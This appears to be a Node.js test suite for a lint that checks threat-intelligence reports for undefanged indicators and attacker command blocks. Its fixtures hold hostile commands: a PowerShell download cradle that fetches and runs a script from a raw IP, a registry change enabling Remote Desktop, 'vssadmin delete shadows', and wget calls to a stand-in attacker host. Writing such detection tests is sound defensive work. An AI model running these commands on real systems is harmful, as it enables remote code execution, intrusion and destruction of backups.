'use strict';
/* T-0500.1.12 rule 5: the defang lint. Controls required by the brief:
     - the sliver-c2 control: an unmarked block holding a PowerShell download cradle to a raw-IP C2 FAILs (the real report's line
       217 did so at site HEAD 559a6de: tasks/runs/T-0500.1.12/tool/tool-report.md records that run); the same block defanged
       per rule 2 (bracketed command name, hxxp, [.]) passes
     - a block marked {: .hl-copy} keeps its raw values and is skipped, and is counted
     - front matter: ioc_highlights is scanned, title and description are not
     - zero denominator is NOT CHECKED, never PASS
   Fixture addresses are documentation ranges (RFC 5737). */
var test = require('node:test');
var assert = require('node:assert');
var fs = require('node:fs');
var os = require('node:os');
var path = require('node:path');
var cp = require('node:child_process');
var L = require('../check-defang.js');

var allow = L.makeAllow([]);
function scan(md) { var st = L.newStats(); var f = L.scanFile(md, 't.md', allow, st); return { f: f, st: st }; }
function kinds(r) { return r.f.map(function (x) { return x.kind; }).sort(); }

var CRADLE = "powershell -ep bypass -w hidden -c iex((New-Object Net.WebClient).DownloadString('http://198.51.100.17:42718/task_39.ps1'))";
var CRADLE_DEF = "[p]owershell -ep bypass -w hidden -c iex((New-Object Net.WebClient).DownloadString('hxxp://198[.]51[.]100[.]17:42718/task_39.ps1'))";
function doc(block, ial) { return '# Report\n\nIts action is a single line:\n\n```\n' + block + '\n```\n' + (ial || '') + '\nAfter.\n'; }

test('self-test: known positives flagged, defanged twins and private addresses clean', function () {
  assert.deepStrictEqual(L.selfTest(), []);
});

test('control: the sliver-c2 shape (unmarked cradle block to a raw-IP C2) FAILs on the block and on the URL', function () {
  var r = scan(doc(CRADLE));
  assert.deepStrictEqual(kinds(r), ['ATTACKER-COMMAND-BLOCK', 'URL']);
  var blk = r.f.find(function (x) { return x.kind === 'ATTACKER-COMMAND-BLOCK'; });
  assert.strictEqual(blk.line, 5, 'the finding names the fence line, as the report line 217 does');
  assert.strictEqual(r.st.cmdBlocksBare, 1);
});

test('control: the same block defanged per rule 2 passes', function () {
  var r = scan(doc(CRADLE_DEF));
  assert.deepStrictEqual(r.f, []);
  assert.strictEqual(r.st.cmdBlocksBracketed, 1);
  assert.strictEqual(r.st.cmdBlocksBare, 0);
});

test('each half of the defang is checked on its own: a bracketed command with a raw URL fails, a defanged URL with a bare command fails', function () {
  assert.deepStrictEqual(kinds(scan(doc(CRADLE.replace('powershell', '[p]owershell')))), ['URL']);
  assert.deepStrictEqual(kinds(scan(doc(CRADLE_DEF.replace('[p]owershell', 'powershell')))), ['ATTACKER-COMMAND-BLOCK']);
  // a canonical host after a raw http scheme is still a violation (the scheme is hxxp)
  assert.deepStrictEqual(kinds(scan(doc(CRADLE_DEF.replace('hxxp', 'http')))), ['URL']);
});

test('a block marked {: .hl-copy} is defender content: raw values kept, skipped, and counted', function () {
  var r = scan(doc('iptables -A INPUT -s 198.51.100.17 -j DROP', '{: .hl-copy}'));
  assert.deepStrictEqual(r.f, []);
  assert.strictEqual(r.st.blocksCopy, 1);
  assert.strictEqual(r.st.copyBlockIndicators, 1);
  // kramdown allows several IAL lines under one block; the marker may be on any of them
  assert.deepStrictEqual(scan(doc(CRADLE, '{: .hl-tab-chain}\n{: .hl-copy}')).f, []);
  // a blank line breaks the attachment: the marker then belongs to nothing
  assert.deepStrictEqual(kinds(scan(doc(CRADLE, '\n{: .hl-copy}'))), ['ATTACKER-COMMAND-BLOCK', 'URL']);
  // a different class is not the marker
  assert.deepStrictEqual(kinds(scan(doc(CRADLE, '{: .hl-copy-not}'))), ['ATTACKER-COMMAND-BLOCK', 'URL']);
});

test('commands with no network indicator are still attacker command blocks (the reg add shape)', function () {
  var reg = 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f';
  assert.deepStrictEqual(kinds(scan(doc(reg))), ['ATTACKER-COMMAND-BLOCK']);
  assert.deepStrictEqual(scan(doc(reg.replace('reg', '[r]eg'))).f, []);
  assert.deepStrictEqual(scan(doc('vssadmin delete shadows /all /quiet')).f.map(function (x) { return x.kind; }), ['ATTACKER-COMMAND-BLOCK']);
  assert.deepStrictEqual(scan(doc('schtasks /create /tn x /tr y').replace('schtasks', '[s]chtasks')).f, []);
});

test('a block with a bracketed token passes; command-like lines still bare in it are counted as a NOTE, not a finding', function () {
  var r = scan(doc('[w]get hxxp://evil[.]example-attacker[.]com/a\nchmod 777 a\nrm a'));
  assert.deepStrictEqual(r.f, []);
  assert.strictEqual(r.st.cmdLinesUnbracketedInBracketedBlocks, 2);
});

test('ordinary words and data blocks are not commands: a log table, structured data, comments', function () {
  assert.deepStrictEqual(scan(doc('Start Time    Type    Service\n10:01        Alert   Edge')).f, []);
  assert.deepStrictEqual(scan(doc('# powershell -ep bypass is only a comment here')).f, []);
  assert.deepStrictEqual(scan('```json\n{"cmd": "powershell -ep bypass"}\n```\n').f, []);
  assert.deepStrictEqual(scan('```yaml\nrun: reg add x\n```\n').f, []);
  assert.deepStrictEqual(kinds(scan(doc('Start /b payload.exe'))), ['ATTACKER-COMMAND-BLOCK']);
});

test('prose, inline code, tables and lists: raw indicators flagged, defanged, private and link targets not', function () {
  var md = [
    'The operator used 198.51.100.17 and `198.51.100.18:8080` and host evil.example-attacker.com.',
    '',
    '| IOC | Note |',
    '|---|---|',
    '| 198.51.100.19 | c2 |',
    '- ops@evil.example-attacker.com wrote',
    '',
    'Defanged 198[.]51[.]100[.]20 and evil[.]example-attacker[.]com and ops[@]evil[.]example-attacker[.]com fine.',
    'Private 10.0.0.5, 192.168.1.1, 127.0.0.1, 172.16.4.4 and a mask 255.255.255.0 are out of scope.',
    'Cited in [the vendor write-up](https://vendor.example-attacker.com/blog/post) and ![fig](/assets/images/a.png) and <a href="https://x.example-attacker.com/p">x</a>.',
    '[1]: https://ref.example-attacker.com/a',
    'A version 10.0.19041.1 and a build 6.1.7601.17514 are not addresses.'
  ].join('\n');
  var r = scan(md);
  assert.deepStrictEqual(kinds(r), ['DOMAIN', 'EMAIL', 'IPV4', 'IPV4', 'IPV4']);
  assert.strictEqual(r.st.matchedPrivate, 5, 'four private addresses plus the netmask');
  assert.ok(r.st.matchedDefanged >= 3);
});

test('a partly defanged host is a finding: the canonical form defangs every dot', function () {
  assert.deepStrictEqual(kinds(scan('seen at 198[.]51.100.17 and evil[.]example-attacker.com\n')), ['DOMAIN-PARTLY-DEFANGED', 'IPV4-PARTLY-DEFANGED']);
  assert.deepStrictEqual(kinds(scan('mail ops@evil[.]example-attacker[.]com\n')), ['EMAIL']);
});

test('the allow list suppresses and COUNTS: nothing is silent, and a domain entry covers its subdomains', function () {
  var tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hl-defang-allow-'));
  try {
    var f = path.join(tmp, 'allow.txt');
    fs.writeFileSync(f, '# vendor names\nvendor.example-attacker.com  # a vendor named as such\n198.51.100.99  # a documentation-range probe address\n');
    var a = L.makeAllow([f]);
    var st = L.newStats();
    var found = L.scanFile('see docs.vendor.example-attacker.com and 198.51.100.99 and 198.51.100.98 and https://vendor.example-attacker.com/x\n', 't.md', a, st);
    assert.deepStrictEqual(found.map(function (x) { return x.kind; }), ['IPV4']);
    assert.strictEqual(st.matchedAllowed, 3);
    assert.strictEqual(st.allowedBy['vendor.example-attacker.com'], 2);
    // the built-in list holds no hosting, code, paste or storage service
    assert.deepStrictEqual(kinds(scan('see https://github.com/x/y and https://pastebin.com/abc and https://cdn.discordapp.com/a\n')), ['URL', 'URL', 'URL']);
  } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
});

test('front matter: ioc_highlights is scanned; title, description and permalink are page identity and are not', function () {
  var md = '---\ntitle: "Sliver C2 on 198.51.100.17"\ndescription: "Staging host 198.51.100.17 and evil.example-attacker.com"\npermalink: /reports/sliver-c2-198-51-100-17/\nioc_highlights:\n  - label: C2\n    value: "198.51.100.17:8088"\n  - label: Host\n    value: "evil[.]example-attacker[.]com"\n---\n\nBody with nothing.\n';
  var r = scan(md);
  assert.deepStrictEqual(kinds(r), ['IPV4']);
  assert.strictEqual(r.f[0].ctx, 'front-matter:ioc_highlights');
  assert.strictEqual(r.f[0].line, 7);
});

test('a fenced block inside a blockquote and a tilde fence are blocks too', function () {
  assert.deepStrictEqual(kinds(scan('> ```\n> ' + CRADLE + '\n> ```\n')), ['ATTACKER-COMMAND-BLOCK', 'URL']);
  assert.deepStrictEqual(kinds(scan('~~~\n' + CRADLE + '\n~~~\n')), ['ATTACKER-COMMAND-BLOCK', 'URL']);
});

test('the findings are printed defanged: the lint output is not a copy-ready list', function () {
  assert.strictEqual(L.defangForPrint('http://198.51.100.17:8080/a.ps1'), 'hxxp://198[.]51[.]100[.]17:8080/a[.]ps1');
  assert.strictEqual(L.defangForPrint('ops@evil.example.com'), 'ops[@]evil[.]example[.]com');
});

test('CLI: FAIL exit 1 with a denominator, PASS exit 0 on the defanged twin, NOT CHECKED exit 2 on an empty file', function () {
  var tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hl-defang-cli-'));
  var cli = path.join(__dirname, '..', 'check-defang.js');
  function run(name, text) {
    var d = path.join(tmp, name); fs.mkdirSync(d);
    fs.writeFileSync(path.join(d, 'index.md'), text);
    return cp.spawnSync(process.execPath, [cli, d], { encoding: 'utf8' });
  }
  try {
    var bad = run('bad', doc(CRADLE));
    assert.strictEqual(bad.status, 1);
    assert.match(bad.stdout, /FAIL .*2 finding\(s\).*lines, 1 blocks, \d+ indicator tokens scanned in 1 file\(s\)/);
    assert.doesNotMatch(bad.stdout, /198\.51\.100\.17/, 'the raw address is never printed');
    var good = run('good', doc(CRADLE_DEF));
    assert.strictEqual(good.status, 0, good.stdout);
    assert.match(good.stdout, /^PASS /m);
    var empty = run('empty', '');
    assert.strictEqual(empty.status, 2);
    assert.match(empty.stdout, /NOT CHECKED .*zero denominator/);
    assert.strictEqual(cp.spawnSync(process.execPath, [cli, path.join(tmp, 'nope')], { encoding: 'utf8' }).status, 2);
  } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
});

test('Liquid src path: an address inside src="{{ "/assets/.. 198.51.100.17 .." | relative_url }}" is an asset path, not a finding; the alt text still is', function () {
  var img = '  <img src="{{ "/assets/images/OpenDirectory-198.51.100.17/a.png" | relative_url }}" alt="shot of 198.51.100.17">\n';
  var r = scan('# t\n\n' + img);
  assert.deepStrictEqual(kinds(r), ['IPV4'], 'one finding: the alt text only');
  var r2 = scan('# t\n\n' + img.replace('alt="shot of 198.51.100.17"', 'alt="shot of 198[.]51[.]100[.]17"'));
  assert.deepStrictEqual(kinds(r2), []);
});

/* ---- ws / wss (lead decision, T-0500.1.12 d5fix): scheme kept, host defanged; a bare scheme mention is no indicator ---- */

test('ws/wss: a URL to a raw documentation-range IP FAILs; the same with [.] dots and a bare ws:// PASS', function () {
  assert.deepStrictEqual(kinds(scan('The agent opens ws://192.0.2.7:8080/stream and wss://192.0.2.7/x here.\n')), ['URL', 'URL']);
  var ok = scan('The agent opens ws://192[.]0[.]2[.]7:8080/stream and wss://192[.]0[.]2[.]7/x here.\n');
  assert.deepStrictEqual(ok.f, []);
  assert.strictEqual(ok.st.matchedDefanged, 2, 'both defanged ws URLs are counted, not silently dropped');
  var bare = scan('WebSocket (ws://) connections, `wss://`, "ws://" and ws:// alone are scheme mentions.\n\n```\nURL scheme: ws://\n```\n');
  assert.deepStrictEqual(bare.f, []);
  assert.strictEqual(bare.st.matchedFlagged + bare.st.matchedDefanged, 0);
});

test('ws/wss: a domain host takes the host defang only; a partly defanged host and a raw domain are findings; private and dotless hosts are not', function () {
  assert.deepStrictEqual(kinds(scan('connects to ws://c2.example-attacker.com/ch\n')), ['URL']);
  assert.deepStrictEqual(scan('connects to wss://c2[.]example-attacker[.]com/ch\n').f, []);
  assert.deepStrictEqual(kinds(scan('connects to ws://c2[.]example-attacker.com/ch\n')), ['URL']);
  assert.deepStrictEqual(scan('dev ws://localhost:8080/x and ws://192.168.1.5/x and ws://{host}/x and ws://10[.]0[.]0[.]1/x\n').f, []);
  // the other schemes are unchanged: the scheme itself is the violation
  assert.deepStrictEqual(kinds(scan('see http://192[.]0[.]2[.]7/x and ftp://192[.]0[.]2[.]7/x\n')), ['URL', 'URL']);
});

test('ws/wss: a ws URL to a path with dots and a defanged host passes; the allow list covers a ws host like any other', function () {
  assert.deepStrictEqual(scan('ws://192[.]0[.]2[.]7:9/a.b.c/d.e\n').f, []);
  var tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hl-defang-ws-'));
  try {
    var f = path.join(tmp, 'a.txt'); fs.writeFileSync(f, 'vendor.example-attacker.com  # vendor websocket endpoint named as such\n');
    var st = L.newStats();
    assert.deepStrictEqual(L.scanFile('ws://vendor.example-attacker.com/s\n', 't.md', L.makeAllow([f]), st), []);
    assert.strictEqual(st.matchedAllowed, 1);
  } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
});

/* ---- allow files: reasons required, picked up by slug, block exceptions ---- */

function withTmp(fn) {
  var tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hl-defang-allow2-'));
  try { return fn(tmp); } finally { fs.rmSync(tmp, { recursive: true, force: true }); }
}
var CLI = path.join(__dirname, '..', 'check-defang.js');
function cli(args) { return cp.spawnSync(process.execPath, [CLI].concat(args), { encoding: 'utf8' }); }

test('allow file: an entry without a reason is refused (NOT CHECKED), a pure comment line is fine', function () {
  withTmp(function (tmp) {
    var f = path.join(tmp, 'a.txt');
    fs.writeFileSync(f, '# header only\nvendor.example-attacker.com\n');
    assert.throws(function () { L.makeAllow([f]); }, /without a reason \(a\.txt:2\)/);
    fs.writeFileSync(f, '# header only\nvendor.example-attacker.com  #   \n');
    assert.throws(function () { L.makeAllow([f]); }, /without a reason/);
    fs.writeFileSync(f, 'block index.md first line\n');
    assert.throws(function () { L.makeAllow([f]); }, /without a reason/);
    fs.writeFileSync(f, 'block index.md first line  # reason\n');
    assert.throws(function () { L.makeAllow([f]); }, /malformed block exception/);
    var d = path.join(tmp, 'r'); fs.mkdirSync(d); fs.writeFileSync(path.join(d, 'index.md'), '# t\n\nhost vendor.example-attacker.com\n');
    fs.writeFileSync(f, 'vendor.example-attacker.com\n');
    var r = cli([d, '--allow', f]);
    assert.strictEqual(r.status, 2, r.stdout);
    assert.match(r.stdout, /NOT CHECKED .*without a reason/);
  });
});

test('allow file by slug: the folder name picks <allow dir>/<slug>.txt with no flag; with the file removed the report FAILs (the control)', function () {
  withTmp(function (tmp) {
    var dir = path.join(tmp, 'defang-allow'); fs.mkdirSync(dir);
    var rep = path.join(tmp, 'reports', 'my-slug'); fs.mkdirSync(rep, { recursive: true });
    fs.writeFileSync(path.join(rep, 'index.md'), '# t\n\nThe report names vendor.example-attacker.com as a product.\n');
    fs.writeFileSync(path.join(dir, 'my-slug.txt'), 'vendor.example-attacker.com  # product named as such\n');
    var withFile = cli([rep, '--allow-dir', dir]);
    assert.strictEqual(withFile.status, 0, withFile.stdout);
    assert.match(withFile.stdout, /allow file  .*my-slug\.txt/);
    assert.match(withFile.stdout, /PASS .*allow file: my-slug\.txt, 1 hit\(s\) suppressed, 0 block exception\(s\)/);
    // the same folder addressed by its index.md picks the same file
    assert.strictEqual(cli([path.join(rep, 'index.md'), '--allow-dir', dir]).status, 0);
    // control: the file removed -> FAIL; the file for another slug does not help
    fs.renameSync(path.join(dir, 'my-slug.txt'), path.join(dir, 'other-slug.txt'));
    var without = cli([rep, '--allow-dir', dir]);
    assert.strictEqual(without.status, 1, without.stdout);
    assert.match(without.stdout, /allow file  none at .*my-slug\.txt/);
    assert.match(without.stdout, /FINDING .*DOMAIN/);
    // --no-auto-allow reads the built-in list only, even when the file exists
    fs.renameSync(path.join(dir, 'other-slug.txt'), path.join(dir, 'my-slug.txt'));
    assert.strictEqual(cli([rep, '--allow-dir', dir, '--no-auto-allow']).status, 1);
  });
});

test('allow file aliases: a copy whose folder name differs reads the site slug\'s file; an alias without a reason is refused', function () {
  withTmp(function (tmp) {
    var dir = path.join(tmp, 'defang-allow'); fs.mkdirSync(dir);
    var rep = path.join(tmp, 'vault-name'); fs.mkdirSync(rep);
    fs.writeFileSync(path.join(rep, 'index.md'), '# t\n\nThe report names vendor.example-attacker.com as a product.\n');
    fs.writeFileSync(path.join(dir, 'site-name.txt'), 'vendor.example-attacker.com  # product named as such\n');
    assert.strictEqual(cli([rep, '--allow-dir', dir]).status, 1);
    fs.writeFileSync(path.join(dir, '_aliases.txt'), '# header\nvault-name  site-name  # the vault folder name of the site report\n');
    var r = cli([rep, '--allow-dir', dir]);
    assert.strictEqual(r.status, 0, r.stdout);
    assert.match(r.stdout, /\(alias of site-name\)/);
    fs.writeFileSync(path.join(dir, '_aliases.txt'), 'vault-name  site-name\n');
    assert.strictEqual(cli([rep, '--allow-dir', dir]).status, 2);
  });
});

var BLOCK_DOC = '# Report\n\nDiagram:\n\n```\nOperator VPS (198[.]51[.]100[.]17) --- port 18080\nSSH keys: a.ppk (PuTTY format)\n```\n\nAnd a real command:\n\n```\nwget hxxp://198[.]51[.]100[.]17/a\n```\n';

test('block exception: excuses exactly the named block (counted), never the other blocks; stale and broad exceptions FAIL', function () {
  withTmp(function (tmp) {
    var dir = path.join(tmp, 'defang-allow'); fs.mkdirSync(dir);
    var rep = path.join(tmp, 'rep'); fs.mkdirSync(rep);
    fs.writeFileSync(path.join(rep, 'index.md'), BLOCK_DOC);
    function run(entries) { fs.writeFileSync(path.join(dir, 'rep.txt'), entries); return cli([rep, '--allow-dir', dir]); }
    // no exception: both blocks flagged
    var none = cli([rep, '--allow-dir', dir]);
    assert.strictEqual(none.status, 1);
    assert.match(none.stdout, /ATTACKER-COMMAND-BLOCK 2/);
    // one exception for the diagram: it goes, the wget block stays
    var one = run('block index.md | Operator VPS (198[.]51[.]100[.]17)  # ASCII diagram, no command\n');
    assert.strictEqual(one.status, 1);
    assert.match(one.stdout, /ATTACKER-COMMAND-BLOCK 1\)/);
    assert.match(one.stdout, /excepted    1 command-block finding\(s\).*index\.md:5 \(ASCII diagram, no command\)/);
    assert.match(one.stdout, /1 block exception\(s\)/);
    // both excused -> PASS, and both are counted
    var two = run('block index.md | Operator VPS  # ASCII diagram\nblock index.md | wget hxxp  # accepted for the test\n');
    assert.strictEqual(two.status, 0, two.stdout);
    assert.match(two.stdout, /2 block exception\(s\)/);
    // an exception for another file does not apply; a stale one (matches no block in a file read) FAILs
    var stale = run('block index.md | Operator VPS  # ASCII diagram\nblock index.md | wget hxxp  # ok\nblock index.md | curl hxxp  # matches nothing\n');
    assert.strictEqual(stale.status, 1);
    assert.match(stale.stdout, /STALE-BLOCK-EXCEPTION/);
    var other = run('block other.md | Operator VPS  # wrong file\n');
    assert.match(other.stdout, /ATTACKER-COMMAND-BLOCK 2/);
    assert.doesNotMatch(other.stdout, /STALE-BLOCK-EXCEPTION/, 'an exception for a file that was not read is not stale');
    // too broad: one exception matching two blocks FAILs
    fs.writeFileSync(path.join(rep, 'index.md'), BLOCK_DOC + '\n```\nOperator VPS (198[.]51[.]100[.]17) again\nSSH keys: b\n```\n');
    var broad = run('block index.md | Operator VPS  # too short a prefix\nblock index.md | wget hxxp  # ok\n');
    assert.strictEqual(broad.status, 1);
    assert.match(broad.stdout, /BROAD-BLOCK-EXCEPTION/);
  });
});

test('block exception: it excuses the command-block finding only; a raw indicator in the same block is still a finding', function () {
  var a = L.makeAllow([]);
  a.blocks.push({ file: 't.md', prefix: 'wget', reason: 'test', src: 'x', used: 0 });
  var st = L.newStats();
  var f = L.scanFile('```\nwget http://198.51.100.17/a\n```\n', 't.md', a, st);
  assert.deepStrictEqual(f.map(function (x) { return x.kind; }), ['URL']);
  assert.strictEqual(st.blockExceptions, 1);
});

test('the in-repo allow dir: every file parses with a reason on every line and names a report folder (or is the alias file)', function () {
  var dir = path.join(__dirname, '..', 'defang-allow');
  var reports = path.join(__dirname, '..', '..', '..', 'reports');
  var files = fs.readdirSync(dir).filter(function (n) { return /\.txt$/.test(n); });
  assert.ok(files.length >= 40, 'the allow dir holds the per-report files (' + files.length + ')');
  files.forEach(function (n) {
    if (n === '_aliases.txt') return;
    L.makeAllow([path.join(dir, n)]); /* throws on a line without a reason */
    assert.ok(fs.existsSync(path.join(reports, n.replace(/\.txt$/, ''))), n + ' names no folder under reports/');
  });
  fs.readFileSync(path.join(dir, '_aliases.txt'), 'utf8').split('\n').forEach(function (l) {
    var b = l.split('#')[0].trim(); if (!b) return;
    var p = b.split(/\s+/);
    assert.ok(fs.existsSync(path.join(reports, p[1])), 'alias target ' + p[1] + ' is not a report folder');
    assert.ok(l.split('#')[1] && l.split('#')[1].trim(), 'alias has a reason');
  });
});
